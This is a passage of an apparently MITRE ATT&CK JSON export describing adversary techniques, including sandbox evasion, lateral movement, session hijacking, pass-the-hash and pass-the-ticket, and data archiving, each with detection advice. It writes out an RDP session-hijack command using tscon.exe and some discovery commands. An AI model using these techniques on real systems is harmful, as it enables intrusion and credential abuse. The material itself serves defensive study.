        "description": " \nAn adversary may gather the system time and/or time zone from a local or remote system. The system time is set and stored by the Windows Time Service within a domain to maintain time synchronization between systems and services in an enterprise network.  \n  \n\nSystem time information may be gathered in a number of ways, such as with  Net on Windows by performing  net time \\hostname to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using  w32tm /tz .  \nThe information could be useful for performing other techniques, such as executing a file with a  Scheduled Task/Job   \n, or to discover locality information based on time zone to assist in victim targeting.  ",
        "detection": "\nCommand-line interface monitoring may be useful to detect instances of net.exe or other command-line utilities being used to gather system time or time zone. Methods of detecting API use for gathering this information are likely less useful due to how often they may be used by legitimate software.\n\n"
      },
      "T1497": {
        "name": "Virtualization/Sandbox Evasion",
        "description": " \nAdversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from  Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors. \nAdversaries may use several methods to accomplish  Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.  \n ",
        "detection": "\nVirtualization, sandbox, user activity, and related discovery techniques will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.\n\n"
      },
      "T1497.001": {
        "name": "System Checks",
        "description": " \nAdversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from  Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors. \nSpecific checks may will vary based on the target and/or adversary, but may involve behaviors such as  Windows Management Instrumentation ,  PowerShell ,  System Information Discovery , and  Query Registry to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. \nChecks could include generic system properties such as uptime and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. \nOther common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions.  \nIn applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. \nHardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.  \n ",
        "detection": "\nVirtualization/sandbox related system checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.\n\n"
      },
      "T1497.002": {
        "name": "User Activity Based Checks",
        "description": " \nAdversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from  Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors. \nAdversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks  \n, browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro  \nor waiting for a user to double click on an embedded image to activate.  \n  ",
        "detection": "\nUser activity-based checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection. \n\n"
      },
      "T1497.003": {
        "name": "Time Based Evasion",
        "description": " \nAdversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time. \nAdversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex:  Scheduled Task/Job ). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled  Multi-Stage Channels to avoid analysis and scrutiny.  ",
        "detection": "\nTime-based evasion will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection. \n\n"
      }
    }
  },
  "TA0008": {
    "name": "Lateral Movement",
    "description": "\nThe adversary is trying to move through your environment.Lateral Movement consists of techniques that adversaries use to enter and control remote systems on a network. Following through on their primary objective often requires exploring the network to find their target and subsequently gaining access to it. Reaching their objective often involves pivoting through multiple systems and accounts to gain. Adversaries might install their own remote access tools to accomplish Lateral Movement or use legitimate credentials with native network and operating system tools, which may be stealthier. \n",
    "technique": {
      "T1210": {
        "name": "Exploitation of Remote Services",
        "description": " \nAdversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system. \nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through  Network Service Scanning or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources. \nThere are several well-known vulnerabilities that exist in common services such as SMB  \nand RDP  \nas well as applications that may be used within internal networks such as MySQL  \nand web server services.  \n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve  Exploitation for Privilege Escalation as a result of lateral movement exploitation as well.  ",
        "detection": "\nDetecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the processes. This could include suspicious files written to disk, evidence of Process Injection for attempts to hide execution, evidence of Discovery, or other unusual network traffic that may indicate additional tools transferred to the system.\n\n"
      },
      "T1534": {
        "name": "Internal Spearphishing",
        "description": " \nAdversaries may use internal spearphishing to gain access to additional information or exploit other users within the same organization after they already have access to accounts or systems within the environment. Internal spearphishing is multi-staged attack where an email account is owned either by controlling the user's device with previously installed malware or by compromising the account credentials of the user. Adversaries attempt to take advantage of a trusted internal account to increase the likelihood of tricking the target into falling for the phish attempt.  \n\nAdversaries may leverage  Spearphishing Attachment or  Spearphishing Link as part of internal spearphishing to deliver a payload or redirect to an external site to capture credentials through  Input Capture on sites that mimic email login interfaces. \nThere have been notable incidents where internal spearphishing has been used. The Eye Pyramid campaign used phishing emails with malicious attachments for lateral movement between victims, compromising nearly 18,000 email accounts in the process.  \nThe Syrian Electronic Army (SEA) compromised email accounts at the Financial Times (FT) to steal additional account credentials. Once FT learned of the attack and began warning employees of the threat, the SEA sent phishing emails mimicking the Financial Times IT department and were able to compromise even more users.  \n ",
        "detection": "\nNetwork intrusion detection systems and email gateways usually do not scan internal email, but an organization can leverage the journaling-based solution which sends a copy of emails to a security service for offline analysis or incorporate service-integrated solutions using on-premise or API-based integrations to help detect internal spearphishing attacks. \n\n"
      },
      "T1570": {
        "name": "Lateral Tool Transfer",
        "description": " \nAdversaries may transfer tools or other files between systems in a compromised environment. Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Adversaries may copy files laterally between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with  SMB/Windows Admin Shares or  Remote Desktop Protocol . Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.  ",
        "detection": "\nMonitor for file creation and files transferred within a network using protocols such as SMB. Unusual processes with internal network connections creating files on-system may be suspicious. Consider monitoring for abnormal usage of utilities and command-line arguments that may be used in support of remote transfer of files. Considering monitoring for alike file hashes or characteristics (ex: filename) that are created on multiple hosts.\n\n"
      },
      "T1563": {
        "name": "Remote Service Session Hijacking",
        "description": " \nAdversaries may take control of preexisting sessions with remote services to move laterally in an environment. Users may use valid credentials to log into a service specifically designed to accept remote connections, such as telnet, SSH, and RDP. When a user logs into a service, a session will be established that will allow them to maintain a continuous interaction with that service. \nAdversaries may commandeer these sessions to carry out actions on remote systems.  Remote Service Session Hijacking differs from use of  Remote Services because it hijacks an existing session rather than creating a new session using  Valid Accounts .  \n \n ",
        "detection": "\nUse of these services may be legitimate, depending upon the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with that service. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.Monitor for processes and command-line arguments associated with hijacking service sessions.\n\n"
      },
      "T1563.001": {
        "name": "SSH Hijacking",
        "description": " \nAdversaries may hijack a legitimate user's SSH session to move laterally within an environment. Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair. \nIn order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial.  \n \n \n \n\n SSH Hijacking differs from use of  SSH because it hijacks an existing SSH session rather than creating a new session using  Valid Accounts .  ",
        "detection": "\nUse of SSH may be legitimate, depending upon the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with SSH. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time. Also monitor user SSH-agent socket files being used by different users.\n\n"
      },
      "T1563.002": {
        "name": "RDP Hijacking",
        "description": " \nAdversaries may hijack a legitimate user’s remote desktop session to move laterally within an environment. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).  \n\nAdversaries may perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session. With System permissions and using Terminal Services Console,  c:\\windows\\system32\\tscon.exe [session number to be stolen] , an adversary can hijack a session without the need for credentials or prompts to the user.  \nThis can be done remotely or locally and with active or disconnected sessions.  \nIt can also lead to  Remote System Discovery and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in red teaming tools.  \n ",
        "detection": "\nConsider monitoring processes for tscon.exe usage and monitor service creation that uses cmd.exe /k or cmd.exe /c in its arguments to detect RDP session hijacking.Use of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP.\n\n"
      },
      "T1021": {
        "name": "Remote Services",
        "description": " \nAdversaries may use  Valid Accounts to log into a service specifically designed to accept remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user. \nIn an enterprise environment, servers and workstations can be organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP).  \n \n ",
        "detection": "\nCorrelate use of login activity related to remote services with unusual behavior or other malicious or suspicious activity. Adversaries will likely need to learn about an environment and the relationships between systems through Discovery techniques prior to attempting Lateral Movement.\n\n"
      },
      "T1021.001": {
        "name": "Remote Desktop Protocol",
        "description": " \nAdversaries may use  Valid Accounts to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user. \nRemote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).  \n \nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the  Accessibility Features technique for Persistence.  \n ",
        "detection": "\nUse of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.\n\n"
      },
      "T1021.002": {
        "name": "SMB/Windows Admin Shares",
        "description": " \nAdversaries may use  Valid Accounts to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user. \nSMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba. \nWindows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include  C$ ,  ADMIN$ , and  IPC$ . Adversaries may use this technique in conjunction with administrator-level  Valid Accounts to remotely access a networked system over SMB,  \nto interact with systems using remote procedure calls (RPCs),  \ntransfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are  Scheduled Task/Job ,  Service Execution , and  Windows Management Instrumentation . Adversaries can also use NTLM hashes to access administrator shares on systems with  Pass the Hash and certain configuration and patch levels.  \n ",
        "detection": "\nEnsure that proper logging of accounts used to log into systems is turned on and centrally collected. Windows logging is able to collect success/failure for accounts that may be used to move laterally and can be collected using tools such as Windows Event Forwarding.    Monitor remote login events and associated SMB activity for file transfers and remote process execution. Monitor the actions of remote users who connect to administrative shares. Monitor for use of tools and commands to connect to remote shares, such as Net, on the command-line interface and Discovery techniques that could be used to find remotely accessible systems. \n\n"
      },
      "T1021.003": {
        "name": "Distributed Component Object Model",
        "description": " \nAdversaries may use  Valid Accounts to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user. \nThe Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.  \n \n\nPermissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry.  \nBy default, only Administrators may remotely activate and launch COM objects through DCOM.  \n\nThrough DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications  \nas well as other Windows objects that contain insecure methods.  \n \nDCOM can also execute macros in existing documents  \nand may also invoke Dynamic Data Exchange (DDE) execution directly through a COM created instance of a Microsoft Office application  \n, bypassing the need for a malicious document.  ",
        "detection": "\nMonitor for COM objects loading DLLs and other modules not typically associated with the application.  Enumeration of COM objects, via Query Registry or PowerShell, may also proceed malicious use.   Monitor for spawning of processes associated with COM objects, especially those invoked by a user different than the one currently logged on.Monitor for any influxes or abnormal increases in Distributed Computing Environment/Remote Procedure Call (DCE/RPC) traffic.\n\n"
      },
      "T1021.004": {
        "name": "SSH",
        "description": " \nAdversaries may use  Valid Accounts to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user. \nSSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user’s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user.  \n ",
        "detection": "\nUse of SSH may be legitimate depending on the environment and how it’s used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with SSH. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.\n\n"
      },
      "T1021.005": {
        "name": "VNC",
        "description": " \nAdversaries may use  Valid Accounts to remotely control machines using Virtual Network Computing (VNC). The adversary may then perform actions as the logged-on user. \nVNC is a desktop sharing system that allows users to remotely control another computer’s display by relaying mouse and keyboard inputs over the network. VNC does not necessarily use standard user credentials. Instead, a VNC client and server may be configured with sets of credentials that are used only for VNC connections.  ",
        "detection": "\nUse of VNC may be legitimate depending on the environment and how it’s used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with VNC.\n\n"
      },
      "T1021.006": {
        "name": "Windows Remote Management",
        "description": " \nAdversaries may use  Valid Accounts to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user. \nWinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services).  \nIt may be called with the  winrm command or by any number of programs such as PowerShell.  \n ",
        "detection": "\nMonitor use of WinRM within an environment by tracking service execution. If it is not normally used or is disabled, then this may be an indicator of suspicious behavior. Monitor processes created and actions taken by the WinRM process or a WinRM invoked script to correlate it with other related events. \n\n"
      },
      "T1091": {
        "name": "Replication Through Removable Media",
        "description": " \nAdversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.  ",
        "detection": "\nMonitor file access on removable media. Detect processes that execute from removable media after it is mounted or when initiated by a user. If a remote access tool is used in this manner to move laterally, then additional actions are likely to occur after execution, such as opening network connections for Command and Control and system and network information Discovery.\n\n"
      },
      "T1072": {
        "name": "Software Deployment Tools",
        "description": " \nAdversaries may gain access to and use third-party software suites installed within an enterprise network, such as administration, monitoring, and deployment systems, to move laterally through the network. Third-party applications and software deployment systems may be in use in the network environment for administration purposes (e.g., SCCM, VNC, HBSS, Altiris, etc.). \nAccess to a third-party network-wide or enterprise-wide software system may enable an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints. \nThe permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform it's intended purpose.  ",
        "detection": "\nDetection methods will vary depending on the type of third-party software or system and how it is typically used. The same investigation process can be applied here as with other potentially malicious activities where the distribution vector is initially unknown but the resulting activity follows a discernible pattern. Analyze the process execution trees, historical activities from the third-party application (such as what types of files are usually pushed), and the resulting activities or events from the file/binary/script pushed to systems. Often these third-party applications will have logs of their own that can be collected and correlated with other data from the environment. Ensure that third-party application logs are on-boarded to the enterprise logging system and the logs are regularly reviewed. Audit software deployment logs and look for suspicious or unauthorized activity. A system not typically used to push software to clients that suddenly is used for such a task outside of a known admin function may be suspicious. Monitor account login activity on these applications to detect suspicious/abnormal usage.Perform application deployment at regular times so that irregular deployment activity stands out. Monitor process activity that does not correlate to known good software. Monitor account login activity on the deployment system.\n\n"
      },
      "T1080": {
        "name": "Taint Shared Content",
        "description": " \nAdversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories. Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally. \nA directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses  Shortcut Modification of directory .LNK files that use  Masquerading to look like the real directories, which are hidden through  Hidden Files and Directories . The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts.  \n\nAdversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the newly infected file when it is executed by a remote system. These infections may target both binary and non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and/or .VBS.  ",
        "detection": "\nProcesses that write or overwrite many files to a network shared directory may be suspicious. Monitor processes that are executed from removable media for malicious or abnormal activity such as network connections due to Command and Control and possible network Discovery techniques.Frequently scan shared network directories for malicious files, hidden files, .LNK files, and other file types that may not typical exist in directories used to share specific types of content.\n\n"
      },
      "T1550": {
        "name": "Use Alternate Authentication Material",
        "description": " \nAdversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.  \n \n\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system—either in memory or on disk—it may be at risk of being stolen through  Credential Access techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.  ",
        "detection": "\nConfigure robust, consistent account activity audit policies across the enterprise and with externally accessible services.  Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\n"
      },
      "T1550.001": {
        "name": "Application Access Token",
        "description": " \nAdversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users and used in lieu of login credentials. \nApplication access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS).  \nOAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.  \n\nFor example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a \"refresh\" token enabling background access is awarded.  \nWith an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.  \n\nCompromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim’s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.  ",
        "detection": "\nMonitor access token activity for abnormal use and permissions granted to unusual or suspicious applications and APIs.\n\n"
      },
      "T1550.002": {
        "name": "Pass the Hash",
        "description": " \nAdversaries may \"pass the hash\" using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash. In this technique, valid password hashes for the account being used are captured using a Credential Access technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems. \nWindows 7 and higher with KB2871997 require valid domain user credentials or RID 500 administrator hashes.  \n ",
        "detection": "\nAudit all logon and credential use events and review for discrepancies. Unusual remote logins that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity. NTLM LogonType 3 authentications that are not associated to a domain login and are not anonymous logins are suspicious.\n\n"
      },
      "T1550.003": {
        "name": "Pass the Ticket",
        "description": " \nAdversaries may \"pass the ticket\" using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system. \nIn this technique, valid Kerberos tickets for  Valid Accounts are captured by  OS Credential Dumping . A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.  \n \n\n Silver Ticket can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).  \n\n Golden Ticket can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.  \n ",
        "detection": "\nAudit all Kerberos authentication and credential use events and review for discrepancies. Unusual remote authentication events that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity.Event ID 4769 is generated on the Domain Controller when using a golden ticket after the KRBTGT password has been reset twice, as mentioned in the mitigation section. The status code 0x1F indicates the action has failed due to \"Integrity check on decrypted field failed\" and indicates misuse by a previously invalidated golden ticket. \n\n"
      },
      "T1550.004": {
        "name": "Web Session Cookie",
        "description": " \nAdversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.  \n\nAuthentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through  Steal Web Session Cookie , the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform. \nThere have been examples of malware targeting session cookies to bypass multi-factor authentication systems.  \n ",
        "detection": "\nMonitor for anomalous access of websites and cloud-based applications by the same user in different locations or by different systems that do not match expected configurations.\n\n"
      }
    }
  },
  "TA0009": {
    "name": "Collection",
    "description": "\nThe adversary is trying to gather data of interest to their goal.Collection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary's objectives. Frequently, the next goal after collecting data is to steal (exfiltrate) the data. Common target sources include various drive types, browsers, audio, video, and email. Common collection methods include capturing screenshots and keyboard input.\n",
    "technique": {
      "T1560": {
        "name": "Archive Collected Data",
        "description": " \nAn adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network. Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender. \nBoth compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.  ",
        "detection": "\nArchival software and archived files can be detected in many ways. Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known archival utilities. This may yield a significant number of benign events, depending on how systems in the environment are typically used.A process that loads the Windows DLL crypt32.dll may be used to perform encryption, decryption, or verification of file signatures.Consider detecting writing of files with extensions and/or headers associated with compressed or encrypted file types. Detection efforts may focus on follow-on exfiltration activity, where compressed or encrypted files can be detected in transit with a network intrusion detection or data loss prevention system analyzing file headers. \n\n"
      },
      "T1560.001": {
        "name": "Archive via Utility",
        "description": " \nAn adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party utilities. Many utilities exist that can archive data, including 7-Zip  \n, WinRAR  \n, and WinZip  \n. Most utilities include functionality to encrypt and/or compress data. \nSome 3rd party utilities may be preinstalled, such as  tar on Linux and macOS or  zip on Windows systems.  ",
        "detection": "\nCommon utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known archival utilities. This may yield a significant number of benign events, depending on how systems in the environment are typically used.Consider detecting writing of files with extensions and/or headers associated with compressed or encrypted file types. Detection efforts may focus on follow-on exfiltration activity, where compressed or encrypted files can be detected in transit with a network intrusion detection or data loss prevention system analyzing file headers. \n\n"
      },
      "T1560.002": {
        "name": "Archive via Library",
        "description": " \nAn adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, including  Python rarfile  \n, libzip  \n, and zlib  \n. Most libraries include functionality to encrypt and/or compress data. \nSome archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows. Note that the libraries are different from the utilities. The libraries can be linked against when compiling, while the utilities require spawning a subshell, or a similar execution mechanism.  ",
        "detection": "\nMonitor processes for accesses to known archival libraries. This may yield a significant number of benign events, depending on how systems in the environment are typically used.Consider detecting writing of files with extensions and/or headers associated with compressed or encrypted file types. Detection efforts may focus on follow-on exfiltration activity, where compressed or encrypted files can be detected in transit with a network intrusion detection or data loss prevention system analyzing file headers. \n\n"
      },
      "T1560.003": {
        "name": "Archive via Custom Method",
        "description": " \nAn adversary may compress or encrypt data that is collected prior to exfiltration using a custom method. Adversaries may choose to use custom archival methods, such as encryption with XOR or stream ciphers implemented with no external library or utility references. Custom implementations of well-known compression algorithms have also been used.  \n ",
        "detection": "\nCustom archival methods can be very difficult to detect, since many of them use standard programming language concepts, such as bitwise operations.\n\n"
      },
      "T1123": {
        "name": "Audio Capture",
